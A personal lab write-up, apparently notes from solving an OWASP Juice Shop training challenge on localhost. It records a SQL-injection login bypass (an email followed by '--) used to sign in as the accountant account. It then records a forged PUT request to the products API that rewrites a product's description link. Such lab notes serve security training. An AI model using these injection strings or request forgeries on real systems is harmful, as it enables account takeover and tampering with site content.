- I have confirmed that SQL injection (with search functionality) to write is a no go in [[deluxe-fraud]] already.
- I have access to [[admin-section]] but I don't see anywhere I can edit the description. But there may be hidden dashboard that I missed earlier.
- And since the requests are basically only GET since there is no writing data (POST, PUT), I doubt I can do anything useful with it.
- Let's explore to see if I can do any more thing with Admin privilege.
- Read the web's `main.js` that I got in [[score-board-and-initial-recon]]
- See the path http://localhost:3000/#/accounting, which when I tried to access, I see `403 You are not allowed to access this page!`
- Let's look closely at the list of user emails again to see if there is an account that I can exploit. Try:
	- `support@juice-sh.op'--` to login as support (does not work)
	- Yes, this may work `accountant@juice-sh.op'--`
- Perfect, login as `accountant@juice-sh.op` works.
- It seems I can edit the price and quantity here! Good sign! I hope to see a PUT request that I can forge to edit the description.
- Try to update price of a product
- See
```
PUT /api/Products/1 HTTP/1.1
[...]

{"price":"2"}
```
- With the response being
```
HTTP/1.1 200 OK
[...]
{"status":"success","data":{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":"2","deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"2026-07-13T14:18:52.242Z","updatedAt":"2026-07-13T16:01:37.049Z","deletedAt":null}
```
- Here it is, the `descripiton` field
- Find `OWASP SSL Advanced Forensic Tool (O-Saft)` on the page http://localhost:3000/#/accounting
- Click to change its price
- See the request
```
PUT /api/Products/9 HTTP/1.1
[...]
{"price":"1"}
```
- And the response
```
HTTP/1.1 200 OK
[...]
{"status":"success","data":{"id":9,"name":"OWASP SSL Advanced Forensic Tool (O-Saft)","description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://www.owasp.org/index.php/O-Saft\" target=\"_blank\">More...</a>","price":"1","deluxePrice":0.01,"image":"orange_juice.jpg","createdAt":"2026-07-13T14:18:52.243Z","updatedAt":"2026-07-13T16:24:36.552Z","deletedAt":null}}
```
- Send to repeater
- Change the payload to 
```
PUT /api/Products/9 HTTP/1.1
[...]
{"description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"}
```
- Click send
- Complete the challenge